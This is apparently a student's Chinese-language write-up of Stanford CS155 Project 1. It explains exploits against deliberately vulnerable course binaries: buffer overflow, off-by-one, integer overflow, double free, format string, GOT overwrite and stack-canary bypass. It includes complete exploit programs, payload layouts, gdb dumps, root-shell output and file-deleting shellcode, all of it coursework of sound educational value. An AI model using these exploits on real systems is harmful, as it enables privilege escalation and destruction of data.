# cs155

- [Proj1](#proj1)
    + [Target1 Buffer overflow](#target1-buffer-overflow)
    + [Target2 Off-by-one](#target2-off-by-one)
    + [Target3 Integer overflow](#target3-integer-overflow)
    + [Target4 Double free](#target4-double-free)
    + [Target5 Format string](#target5-format-string)
    + [Target6 Global offset table](#target6-global-offset-table)
    + [Extra credit bypass stack canary](#extra-credit-bypass-stack-canary)
- [Proj2](#proj2)
    + [Exploit Alpha Cookie Theft](#exploit-alpha-cookie-theft)
    + [Exploit Bravo Cross Site Request Forgery](#exploit-bravo-cross-site-request-forgery)
    + [Exploit Charlie Session Hijacking with Cookies](#exploit-charlie-session-hijacking-with-cookies)
    + [Exploit Delta Cooking the Books with Cookies](#exploit-delta-cooking-the-books-with-cookies)
    + [Exploit Echo SQL Injection](#exploit-echo-sql-injection)
    + [Exploit Foxtrot Profile Worm](#exploit-foxtrot-profile-worm)

# Proj1
## Target1 Buffer overflow
```c
int bar(char *arg, char *out)
{
  strcpy(out, arg);
  return 0;
}

void foo(char *argv[])
{
  char buf[256];
  bar(argv[1], buf);
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target1: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv);
  return 0;
}
```
最基本的buffer overflow，直接更改return的地址，指向buf前面的NOP，然后进入执行shellcode

```console
user@vm-cs155:~/cs155/proj1/sploits$ ./sploit1
#
```

```c
int main(void)
{
  // put '\0' at the end
  char sploitstring[256 + 2 * sizeof(int) + 1];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[sizeof(sploitstring) - 1] = 0;

  // shellcode is a string which ends with '\0'
  // should not copy '\0' to buffer otherwise
  // there wont be a buffer overflow
  memcpy(sploitstring + 100, shellcode, sizeof(shellcode) - 1);

  // address of eip
  int *ret = (int *) (sploitstring + 256 + sizeof(int));
  *ret = 0xbffffc5c;


  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```
## Target2 Off by one
虽然nstrcpy做了范围check，但是多复制了一个byte，因此可以overflow `%ebp`
```c
void nstrcpy(char *out, int outl, char *in)
{
  int i, len;

  len = strlen(in);
  if (len > outl)
    len = outl;

  for (i = 0; i <= len; i++)
    out[i] = in[i];
}

void bar(char *arg)
{
  char buf[200];

  nstrcpy(buf, sizeof buf, arg);
}

void foo(char *argv[])
{
  bar(argv[1]);
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target2: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv);
  return 0;
}
```
因为x86用的是little endian，所以溢出的两个byte就是`%ebp`的最后的两个byte，比如原来系统中`%ebp`为`0xbffffd90`，因为`sploitstring[200]=0`，所以`%ebp`就变为`0xbffffd00`，因为buf里面有201个byte，但是32位机器要连续两个word，所以溢出了两个byte

buf从`0xbffffcc8`开始，`%ebp=0xbffffd90`，buf溢出后修改`%ebp`的最后两个byte使得`%ebp`变成`%ebp=0xbffffd00`也就是在buf中间的`new_ebp`，当函数返回时，`%esp`会从`new_ebp`中load，为了方便显示，`0xbffffd00`中存了`0xffffffff`，然后`%esp`拿栈顶来load给`%eip`也就数`new_ebp`后面的`new_eip`，这也是shellcode的起始地址

```console
user@vm-cs155:~/cs155/proj1/sploits$ ./sploit2
#
```

**target1和target2的区别**

target2中，main调用了foo，foo调用了bar，bar里面buffer overflow，而target1中main只调用了foo，这里就是最大的区别。因为target2中，overflow了bar这个frame的`%ebp`，然后返回到foo的时候，`%esp`从`%ebp`里面load，foo想要返回时，取esp上面的也就是被替换的`%eip`返回，从而进入了shellcode。target1中，overflow了foo这个frame的`%ebp`和`%eip`，然后`%esp` load了`%ebp=0x90909090`，返回进入了shellcode，即使`%ebp`被改了也没问题。

```
                                  ^------------|
                                  |            v
addr: 0xbffffcc8  0xbffffd00 0xbffffd04                          
       [buffer  ...  new_ebp   new_eip ... shellcode]|[ebp]|[return]
val:              0xffffffff 0xbffffd08            0xbffffd00
                        ^                               |
                        |-------------------------------v
```


```console
$ (gdb) x/100x buf
0xbffffcc8: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffcd8: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffce8: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffcf8: 0x90909090  0x90909090  0xffffffff  0xbffffd08
0xbffffd08: 0x895e1feb  0xc0310876  0x89074688  0x0bb00c46
0xbffffd18: 0x4e8df389  0x0c568d08  0xdb3180cd  0xcd40d889
0xbffffd28: 0xffdce880  0x622fffff  0x732f6e69  0x90909068
0xbffffd38: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd48: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd58: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd68: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd78: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd88: 0x90909090  0x90909090  0xbffffd00  0x0804854e
                                         ^
                                        %ebp
```
```c
int main(void)
{
  char sploitstring[201];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[200] = 0;
  
  int offset = 0xbffffd00 - 0xbffffcc8;
  *(int *) (sploitstring + offset) = 0xffffffff;
  *(int *) (sploitstring + offset + 4) = 0xbffffd00 + 4 + 4;
  memcpy(sploitstring + offset + 4 + 4, shellcode, strlen(shellcode)); 

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```
## Target3 Integer overflow
```c
struct widget_t {
  double x;
  double y;
  int count;
};

#define MAX_WIDGETS 1000

int foo(char *in, int count)
{
  struct widget_t buf[MAX_WIDGETS];

  if (count < MAX_WIDGETS) 
    memcpy(buf, in, count * sizeof(struct widget_t));

  return 0;
}

int main(int argc, char *argv[])
{
  int count;
  char *in;

  if (argc != 2)
    {
      fprintf(stderr, "target3: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);

  /*
   * format of argv[1] is as follows:
   *
   * - a count, encoded as a decimal number in ASCII
   * - a comma (",")
   * - the remainder of the data, treated as an array
   *   of struct widget_t
   */

  count = (int)strtoul(argv[1], &in, 10);
  if (*in != ',')
    {
      fprintf(stderr, "target3: argument format is [count],[data]\n");
      exit(EXIT_FAILURE);
    }
  in++;                         /* advance one byte, past the comma */
  foo(in, count);

  return 0;
}
```
关键的是要满足以下几个条件，有符号的count要小于1000，无符号的要满足`(20 * count) mod (2^32) = k`略大于20000，但是又不能太大，否则会seg fault

所以是`20 * count = k + 2^32 * r`，`count = k/20 + 2^32*r/20`，因为k需要略大于20000才能overflow并且需要是20的整数倍，所以取`k=20020`，又因为count需要overflow int，所以`1001+2^32*r/20 > 2^32 - 1`，因此取`r=10`，所以`count=1001+2^31=2147484649`，所以`(20 * 2147484649) mod 2^32 = 20020`，插入shellcode然后修改return地址即可

```console
user@vm-cs155:~/cs155/proj1/sploits$ ./sploit3
#
```


```c
if (count < MAX_WIDGETS) 
    memcpy(buf, in, count * sizeof(struct widget_t));
```
```c
int main(void)
{

  char sploitstring[1000 * (2 * sizeof(double) + sizeof(int)) + 4 + 11];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  // sizeof(struct widget_t) = 20
  // (20 * count) mod 2^32 = 1000 * 20 + 4 + 1
  // (int) count < 0
  // printf("%zu\n", 2147484649*20)=20020
  char *countstring = "2147484649,";
  memcpy(sploitstring, countstring, strlen(countstring));
  memcpy(sploitstring + 40, shellcode, strlen(shellcode));
  *(int *)(sploitstring + 20000 + strlen(countstring) + 4) = 0xbfff6210;

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```
## Target4 Double free
```c
int foo(char *arg)
{
  char *p;
  char *q;

  if ( (p = tmalloc(500)) == NULL)
    {
      fprintf(stderr, "tmalloc failure\n");
      exit(EXIT_FAILURE);
    }
  if ( (q = tmalloc(300)) == NULL)
    {
      fprintf(stderr, "tmalloc failure\n");
      exit(EXIT_FAILURE);
    } 

  tfree(p);
  tfree(q);
  
  if ( (p = tmalloc(1024)) == NULL)
    {
      fprintf(stderr, "tmalloc failure\n");
      exit(EXIT_FAILURE);
    }

  obsd_strlcpy(p, arg, 1024);

  tfree(q);

  return 0;
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target4: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv[1]);
  return 0;
}
```
这里的漏洞是，先tmalloc了p和q，然后tfree了p和q，然后又tmalloc了p，又tfree了q，这里q被free了两次，而第二次tmalloc的p大小刚好覆盖了之前q的位置，拷贝buffer进入heap的时候，可以overflow q指针，当free q指针的时候，就可以导致程序执行顺序错乱
```c
p = tmalloc(500);
q = tmalloc(300);
tfree(p);
tfree(q);
p = tmalloc(1024);
tfree(q);
```
首先先看tmalloc.c里面对chunk的定义，可以看到，每个chunk有个头，头里面是l和r指针，指向的是其他free的heap空间
```c
typedef union CHUNK_TAG
{
  struct
    {
      union CHUNK_TAG *l;       /* leftward chunk */
      union CHUNK_TAG *r;       /* rightward chunk + free bit (see below) */
    } s;
  ALIGN x;
} CHUNK;
```
也就是说，chunk在内存中是这样安排的
```bash
(high mem address)
[data] <data_size> (direct pointer to data points here)
[next ptr] <4>
[prev ptr] <4> (next/prev pointers from other structs point here)
[...] <4>
(low mem address)
```
每次要tfree一个指针q时，会执行以下操作
```c
q.next.prev = q.prev
q.prev.next = q.next
```
因此，首先在buffer里面找到q的位置，设置
```c
*(int *)(sploitstring + 512 - 8) = 0x0804a068; // q.prev = shellcode
*(int *)(sploitstring + 512 - 4) = 0xbffffa70; // q.next = eip
```
当free q指针时，要做`q.next.prev=q.prev`，具体来说就是因为之前已经设置了`q.next=eip`，这里`q.next.prev=(chunk*)eip->prev=*eip`，所以一旦free了q指针，就改变了eip里头的东西，程序就返回到了shellcode。还要注意的是，要把q的free bit置位，然后通过jmp指令跳过eip指向的地址内容发生错乱也就是这里的`\x90`

```console
user@vm-cs155:~/cs155/proj1/sploits$ ./sploit4
#
```

```c
int main(void)
{
  char sploitstring[1024];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[sizeof(sploitstring) - 1] = 0;
  memcpy(sploitstring + 32, shellcode, strlen(shellcode));
  // p = 0x804a068
  // q = 0x804a268
  // q.bk = eip + 1
  // q.bk.fd = p
  *(int *)(sploitstring + 512 - 8) = 0x0804a068;
  *(int *)(sploitstring + 512 - 4) = 0xbffffa70;
  *(int *)(sploitstring + 4) = -1;
  *(short *)(sploitstring) = 0x0ceb;

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```
## Target5 Format string
```c
int foo(char *arg)
{
  char buf[400];
  snprintf(buf, sizeof buf, arg);
  return 0;
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target5: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv[1]);
  return 0;
}
```
先要理解c中可变参数函数的工作原理，传入的第一个参数叫做format string，然后可以传入任意数量的参数
```c
typedef char *va_list;

#define _AUPBND (sizeof (acpi_native_int) - 1)
#define _ADNBND (sizeof (acpi_native_int) - 1)

#define _bnd(X, bnd) (((sizeof (X)) + (bnd)) & (~(bnd)))
#define va_arg(ap, T) (*(T *)(((ap) += (_bnd (T, _AUPBND))) - (_bnd (T,_ADNBND))))
#define va_end(ap) (void) 0
#define va_start(ap, A) (void) ((ap) = (((char *) &(A)) + (_bnd (A,_AUPBND))))

//start.c
static char sprint_buf[1024];
int printf(char *fmt, ...)
{
  va_list args;
  int n;
  va_start(args, fmt);
  n = vsprintf(sprint_buf, fmt, args);
  va_end(args);
  write(stdout, sprint_buf, n);
  return n;
}

int main()
{
  char *str = "hello world";
  int a = 10;
  double b = 20.0;
  printf("str: %s a: %d b: %f", str, a, b);
  printf("str: %s a: %d b: %f", str, a);
}
```
例如第一个printf调用时，倒序把参数进栈，首先压入b，然后压入a，然后压入str的地址，然后压入format string的地址，printf会parse format字符串，输出`str: `，当发现第一个`%s`时候，会向上找大小为`sizeof(char*)`的内容，并认为他是一个指向字符串的指针，输出的stdout，然后继续输出` a: `，发现`%d`时，出栈并认为是一个int然后输出，依次类推。如果出现第二个printf情况时，format string给了三个`%`，但是实际只给如了两个参数，一般的编译器并不会发现问题，而程序会继续往后找一个double的大小，然后输出到stdout，因此如果由用户给如format string，会暴露严重的安全漏洞。
```bash
---------
b = 20.0
---------
a = 10
---------
&str       ---->  "hello world"
---------
&format    ---->  "str: %s a: %d b: %f"
---------
eip
---------
old_ebp
---------
local
---------
```
常见的攻击方法有以下几种
### Crash program
`printf("%s%s%s%s%s")`，会不断dereference null pointer，直到程序崩溃
### View memory
`printf ("%08x.%08x.%08x.%08x.%08x\n")`，可以直接打出内存中的内容，也可以拿到特定内存地址的内容，比如`printf ("\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|")`可以拿到`0x08480110`位置的内容。因为可以直接把`0x08480110`放入栈中，然后计算要偏移几次，这里从format string之后要偏移5次，然后用`%s`输出即可
```bash
----------
0x08480110 <----
----------     |
----------     |
----------     |
----------     |
----------     |
----------     |
&format    ---->
----------
---------- <---- eip
```
### Overwrite memory
这必须要用神奇的`%n`，意思是count已经输出的字符数并存入给的值中，比如，在遇到`%n`之前，已经输出了6个字符，然后把6存入i中，要注意的是，这里传入的是i的地址。
```c
int i;
printf("hello %n", &i);
```
因此，format string不仅仅可以看内存，其实还可以修改内存，这就可以用类似的方法，把call stack中return address改变为shellcode，导致严重的安全问题。

target5中，用的是snprintf(buf, maxLength, format, ...)，注意这里有range check，因此不能overflow，call stack如下所示，先push format string的地址，然后是maxLength，然后是buffer的地址，我们的目标就是把return address中的内容修改为想要的地址，从那儿开始可以滑入shellcode。但是我们发现，`0xbffffe5f-0xbffffb4c=787`，想要通过`%08x`来前进栈指针，`787/4*4>400`是不可能拷贝进入format string的，所以这里要好好利用snprintf的特性，因为在遇到`%`之前，字符会放入buf中，当遇到`%`时，其实可以利用刚刚放入buf的东西来exploit
```bash
----------
format
---------- 0xbffffe5f <--- format
    .
    .
    .
----------
---------- 0xbffffb4c <--- buffer
0xbffffe5f
---------- 0xbffffb48 <--- &format
400
---------- 0xbffffb44 <--- maxLength
0xbffffb4c
---------- 0xbffffb40 <--- &buffer
0x080484e8
---------- 0xbffffb48 <--- return
---------- 0xbffffb48 <--- old_ebp
```
我们这里的目标是把return address中的`0x080484e8`修改为`0xbffffe9f`，这里`0xbffffe9f`指向的是shellcode前面的`\x90`

详细call stack如下所示，snprintf会先把format中`%`之前的字符全都拷贝进入buffer里面，然后开始parse format string。

- **`%127u%n`**: 把`0xbffffb4c`里面的按照127的宽度输出，所以`32+127=0x9f`，通过`%n`存入`0xbffffb3c`指向的地址中，也就是修改了return address的最低两位，这时候return address是`0x0000009f`

- **`%95u%n`**: 把`0xbffffb54`里面的按照95的宽度输出，所以`32+127+95=0xfe`，通过`%n`存入`0xbffffb3c`指向的地址中，这时候return address是`0x0000fe9f`

- **`%257u%n`**: 把`0xbffffb54`里面的按照257的宽度输出，所以`32+127+95+257=0x1ff`，通过`%n`存入`0xbffffb3c`指向的地址中，这时候return address是`0x01fffe9f`

- **`%192u%n`**: 把`0xbffffb54`里面的按照192的宽度输出，所以`32+127+95+257+192=0x2bf`，通过`%n`存入`0xbffffb3c`指向的地址中，这时候return address是`0xbffffe9f`

**终于拿到root了！开心！撒花！**

```console
user@vm-cs155:~/cs155/proj1/sploits$ ./sploit5
#
```

```bash
----------
format: "\xff\xff\xff\xff\x3c\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3d\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3e\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3f\xfb\xff\xbf"
        "%127u%n%95u%n%257u%n%192u%n";
---------- 0xbffffe5f <--- format
    .
    .
    .
---------- 0xbffffb6c
0xbffffb3c
---------- 0xbffffb68
0xffffffff
---------- 0xbffffb64
0xbffffb3c
---------- 0xbffffb60
0xffffffff
---------- 0xbffffb5c
0xbffffb3c
---------- 0xbffffb58
0xffffffff
---------- 0xbffffb54
0xbffffb3c
---------- 0xbffffb50
0xffffffff
---------- 0xbffffb4c <--- buffer
0xbffffe5f
---------- 0xbffffb48 <--- &format
400
---------- 0xbffffb44 <--- maxLength
0xbffffb4c
---------- 0xbffffb40 <--- &buffer
0x080484e8
---------- 0xbffffb48 <--- return
---------- 0xbffffb48 <--- old_ebp
```
```c
int main(void)
{
  char sploitstring[400];
  char *fmt;

  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[sizeof(sploitstring)-1] = '\0';

  fmt = "\xff\xff\xff\xff\x3c\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3d\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3e\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3f\xfb\xff\xbf"
        "%127u%n%95u%n%257u%n%192u%n";

  memcpy(sploitstring, fmt, strlen(fmt));
  memcpy(sploitstring + sizeof(sploitstring) - strlen(shellcode) - 4, shellcode, strlen(shellcode));

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```
## Target6 Global offset table
```c
void nstrcpy(char *out, int outl, char *in)
{
  int i, len;

  len = strlen(in);
  if (len > outl)
    len = outl;

  for (i = 0; i <= len; i++)
    out[i] = in[i];
}

void bar(char *arg)
{
  char buf[200];

  nstrcpy(buf, sizeof buf, arg);
}

void foo(char *argv[])
{
  int *p;
  int a = 0;
  p = &a;

  bar(argv[1]);

  *p = a;

  _exit(0);
  /* not reached */
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target6: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv);
  return 0;
}
```
这题乍一眼看上去好像是第二题，但是其实区别非常非常大，因为`foo`中，最后调用了`_exit(0)`，这样即使修改了return地址，函数`foo`其实不返回，所以无法exploit。仔细看看函数`foo`，调用完函数`bar`之后，执行了`*p = a`，也就是修改了一个指针的内容！如果我们知道`_exit`在GOT中的地址，只要把`_exit`在GOT中的地址改为shellcode的地址，不就能跳入shell了嘛！搞起搞起！

我们先反汇编`foo`，看到最后call了`_exit`
```console
(gdb) disass foo
Dump of assembler code for function foo:
   0x0804855d <+0>: push   %ebp
   0x0804855e <+1>: mov    %esp,%ebp
   0x08048560 <+3>: sub    $0x8,%esp
=> 0x08048563 <+6>: movl   $0x0,-0x8(%ebp)
   0x0804856a <+13>:  lea    -0x8(%ebp),%eax
   0x0804856d <+16>:  mov    %eax,-0x4(%ebp)
   0x08048570 <+19>:  mov    0x8(%ebp),%eax
   0x08048573 <+22>:  add    $0x4,%eax
   0x08048576 <+25>:  mov    (%eax),%eax
   0x08048578 <+27>:  push   %eax
   0x08048579 <+28>:  call   0x804853a <bar>
   0x0804857e <+33>:  add    $0x4,%esp
   0x08048581 <+36>:  mov    -0x8(%ebp),%edx
   0x08048584 <+39>:  mov    -0x4(%ebp),%eax
   0x08048587 <+42>:  mov    %edx,(%eax)
   0x08048589 <+44>:  push   $0x0
   0x0804858b <+46>:  call   0x8048380 <_exit@plt>
End of assembler dump.
```
继续反汇编`_exit`，看到`_exit`其实跳入了`0x804a00c`，这个就是`_exit`的GOT地址
```console
(gdb) disass 0x8048380
Dump of assembler code for function _exit@plt:
   0x08048380 <+0>: jmp    *0x804a00c
   0x08048386 <+6>: push   $0x0
   0x0804838b <+11>:  jmp    0x8048370
End of assembler dump.
```
所以，我们要把`_exit`地址中的东西，改为我们要的shellcode的地址，这里是`0xbffffcc0`，要做的是`*(int*)(0x804a00c) = 0xbffffcc0`，这不就是`*p = a`嘛！！！所以，我们来研究下call stack然后把该放的东西塞进去，就行了！一气呵成！
```bash
---foo----
---------- 0xbffffda0 <--- rt
---------- 0xbffffd9c <--- old_ebp
*p
---------- 0xbffffd98 <--- &p
a
---------- 0xbffffd94 <--- &a
---bar----
arg
---------- 0xbffffd90
---------- 0xbffffd8c <--- rt
0xbffffd9c   溢出之后变成  0xbffffd00
---------- 0xbffffd88 <--- old_ebp
    .
    .
    .
----------
---------- 0xbffffd00 <--- new_ebp
0x0804a00c
---------- 0xbffffcfc <--- new &p
0xbffffcc0
---------- 0xbffffdf8 <--- new &a
    .
    .
    .
---------- 0xbffffcc0 <--- buf
```
和target2类似的道理，off-by-one溢出之后，`bar`中的`old_ebp`被修改为`0xbffffd00`，当bar返回时候，`%esp`从`%ebp`中load，然后调用`*p = a`，而这时候的`*p`和`a`已经变成了`*new_p`和`new_a`如下所示，然后就修改了GOT里头`_exit`的地址，实际指向了shellcode，成功！

```console
user@vm-cs155:~/cs155/proj1/sploits$ ./sploit6
#
```


```c
int main(void)
{
  char sploitstring[201];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[200] = 0;
  int offset = 0xbffffd00 - 0xbffffcc0;
  *(int *) (sploitstring + offset - 4) = 0x0804a00c;
  *(int *) (sploitstring + offset - 8) = 0xbffffcc0;

  memcpy(sploitstring, shellcode, strlen(shellcode));

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```

## Extra credit bypass stack canary
```c
int freadline(int fd, char *buf) {
  int i = 0;
  char next;
  for (;;) {
    int c = read(fd, &next, 1);
    if (c <= 0) {
      break;
    }

    if (next == '\n') {
      return i;
    }

    buf[i] = next;

    i++;
  }
  return -1;
}

int respond_once(int clientfd) {
  char buf[2048];

  int line_len = freadline(clientfd, buf);
  if (line_len <= 0) {
    write(clientfd, "done\r\n", 6);
    close(clientfd);
    return -1;
  }

  write(clientfd, buf, line_len);
  write(clientfd, "\r\n", 2);
  return line_len;
}

void echo_server(int clientfd) {

  while (respond_once(clientfd) >= 0) {
    ;;
  }
}

/* socket-bind-listen idiom */
static int start_server(const char *portstr)
{
    struct addrinfo hints = {0}, *res;
    int sockfd;
    int e, opt = 1;

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    if ((e = getaddrinfo(NULL, portstr, &hints, &res)))
        errx(1, "getaddrinfo: %s", gai_strerror(e));
    if ((sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) < 0)
        err(1, "socket");
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)))
        err(1, "setsockopt");
    if (fcntl(sockfd, F_SETFD, FD_CLOEXEC) < 0)
        err(1, "fcntl");
    if (bind(sockfd, res->ai_addr, res->ai_addrlen))
        err(1, "bind");
    if (listen(sockfd, 5))
        err(1, "listen");
    freeaddrinfo(res);

    return sockfd;
}

int main() {
  char *portstr = "5555";
  int serverfd = start_server(portstr);
  warnx("Listening on port %s", portstr);
  signal(SIGCHLD, SIG_IGN);
  signal(SIGPIPE, SIG_IGN);

  for (;;) {
    int clientfd = accept(serverfd, NULL, NULL);
    int pid;
    switch ((pid = fork()))
    {
    case -1: /* error */
        err(1, "fork");
        close(clientfd);
    case 0:  /* child */
        echo_server(clientfd);
        break;
    default: /* parent */
        close(clientfd);
    }
  }

  return 0;
}
```
题目的要求是，攻击本地服务器，删除文件`/tmp/passwd`，要实现shellcode也要实现buffer overflow

首先分析下target，main函数很长，要攻击的部分很短，只有以下这部分，其他都是实现一个echo服务器。可以看出，就是stack smash，但是打开`Makefile`可以看到这一行，他把`-fstack-protector-all`给打开了，导致会加上stack guard来防止buffer overflow。这个实验的目的就是学会如何绕开stack canary从而实现攻击。

特别要注意的一点是，`\n`的ascii码是`\x0a`，`int freadline(int fd, char *buf)`函数中，当遇到`\n`时会停下，所以**输入的buf中不能有`\x0a`**
```Makefile
extra-credit.o: extra-credit.c
  $(CC) $< -c -o $@ -fstack-protector-all -ggdb -m32 -g -std=c99 -D_GNU_SOURCE
```
```c
int freadline(int fd, char *buf) {
  int i = 0;
  char next;
  for (;;) {
    int c = read(fd, &next, 1);
    if (c <= 0) {
      break;
    }

    if (next == '\n') {
      return i;
    }

    buf[i] = next;

    i++;
  }
  return -1;
}

int respond_once(int clientfd) {
  char buf[2048];

  int line_len = freadline(clientfd, buf);
  if (line_len <= 0) {
    write(clientfd, "done\r\n", 6);
    close(clientfd);
    return -1;
  }

  write(clientfd, buf, line_len);
  write(clientfd, "\r\n", 2);
  return line_len;
}
```
先来实现shellcode，要删除/tmp/passwd可以用系统调用`unlink`，但是特别要注意的是，**`unlink`的syscall_no就是10也就是`\x0a`**，这会导致shellcode拷贝了一半就停下echo回来了。所以要把`%al`里面的10拆开，先放入5然后再放入5即可
```asm
#include <sys/syscall.h>

#define STRING  "/tmp/passwd"
#define STRLEN  11
#define ARGV  (STRLEN+1)
#define ENVP  (ARGV+4)

.globl main
  .type main, @function

 main:
  jmp calladdr

 popladdr:
  popl  %esi
  movl  %esi,(ARGV)(%esi)    /* set up argv pointer to pathname */
  xorl  %eax,%eax            /* get a 32-bit zero value */
  movb  %al,(STRLEN)(%esi)   /* null-terminate our string */
  movl  %eax,(ENVP)(%esi)    /* set up null envp */

  movb  $5,%al               /* syscall arg 1: syscall number */
  add   $5,%al  
  movl  %esi,%ebx            /* syscall arg 2: string pathname */
  leal  ARGV(%esi),%ecx      /* syscall arg 2: argv */
  leal  ENVP(%esi),%edx      /* syscall arg 3: envp */
  int $0x80                  /* invoke syscall */

  xorl  %ebx,%ebx            /* syscall arg 2: 0 */
  movl  %ebx,%eax
  inc %eax                   /* syscall arg 1: SYS_exit (1), uses */
                             /* mov+inc to avoid null byte */
  int $0x80                  /* invoke syscall */

 calladdr:
  call  popladdr
  .ascii  STRING

```
有了shellcode就可以overflow buffer啦，先来看看这个stack canary到底是什么鬼，看到`0x080488c7`位置，`mov    -0xc(%ebp),%edx`然后`xor    %gs:0x14,%edx`，可以看出`%ebp`往下12的位置是canary，xor为了验证是否一样，如果canary变了，`__stack_chk_fail`会报错。（好像通过修改GOT来改变`__stack_chk_fail`的跳转地址也能实现攻击）
```console
(gdb) disass respond_once
Dump of assembler code for function respond_once:
   0x08048816 <+0>: push   %ebp
   0x08048817 <+1>: mov    %esp,%ebp
   0x08048819 <+3>: sub    $0x828,%esp
   0x0804881f <+9>: mov    0x8(%ebp),%eax
   0x08048822 <+12>:  mov    %eax,-0x81c(%ebp)
   0x08048828 <+18>:  mov    %gs:0x14,%eax
   0x0804882e <+24>:  mov    %eax,-0xc(%ebp)
   0x08048831 <+27>:  xor    %eax,%eax
   0x08048833 <+29>:  sub    $0x8,%esp
   0x08048836 <+32>:  lea    -0x80c(%ebp),%eax
   0x0804883c <+38>:  push   %eax
   0x0804883d <+39>:  pushl  -0x81c(%ebp)
   0x08048843 <+45>:  call   0x804879b <freadline>
   0x08048848 <+50>:  add    $0x10,%esp
   0x0804884b <+53>:  mov    %eax,-0x810(%ebp)
   0x08048851 <+59>:  cmpl   $0x0,-0x810(%ebp)
   0x08048858 <+66>:  jg     0x804888a <respond_once+116>
   0x0804885a <+68>:  sub    $0x4,%esp
   0x0804885d <+71>:  push   $0x6
   0x0804885f <+73>:  push   $0x8048bf0
   0x08048864 <+78>:  pushl  -0x81c(%ebp)
   0x0804886a <+84>:  call   0x80485d0 <write@plt>
   0x0804886f <+89>:  add    $0x10,%esp
   0x08048872 <+92>:  sub    $0xc,%esp
   0x08048875 <+95>:  pushl  -0x81c(%ebp)
   0x0804887b <+101>: call   0x8048680 <close@plt>
   0x08048880 <+106>: add    $0x10,%esp
   0x08048883 <+109>: mov    $0xffffffff,%eax
   0x08048888 <+114>: jmp    0x80488c7 <respond_once+177>
   0x0804888a <+116>: mov    -0x810(%ebp),%eax
   0x08048890 <+122>: sub    $0x4,%esp
   0x08048893 <+125>: push   %eax
   0x08048894 <+126>: lea    -0x80c(%ebp),%eax
   0x0804889a <+132>: push   %eax
   0x0804889b <+133>: pushl  -0x81c(%ebp)
   0x080488a1 <+139>: call   0x80485d0 <write@plt>
   0x080488a6 <+144>: add    $0x10,%esp
   0x080488a9 <+147>: sub    $0x4,%esp
   0x080488ac <+150>: push   $0x2
   0x080488ae <+152>: push   $0x8048bf7
   0x080488b3 <+157>: pushl  -0x81c(%ebp)
   0x080488b9 <+163>: call   0x80485d0 <write@plt>
   0x080488be <+168>: add    $0x10,%esp
   0x080488c1 <+171>: mov    -0x810(%ebp),%eax
   0x080488c7 <+177>: mov    -0xc(%ebp),%edx
   0x080488ca <+180>: xor    %gs:0x14,%edx
   0x080488d1 <+187>: je     0x80488d8 <respond_once+194>
   0x080488d3 <+189>: call   0x8048590 <__stack_chk_fail@plt>
   0x080488d8 <+194>: leave
   0x080488d9 <+195>: ret
End of assembler dump.
```
下面开始暴力破解canary，canary的大小是4个byte，比如`0xc5298600`，因为little edian，在内存里面表示是`\x00\x86\x29\xc5`，只要逐个十六进制数破解即可，然后塞入8个byte的JUNK，然后是`%old_ebp`，然后就是`return address`，所以buffer如下所示
```python
final_exploit = sploitstring + canary + "JUNKJUNK" + struct.pack("<I", 0xbfffeddc) + struct.pack("<I", 0xbfffeddc)
```
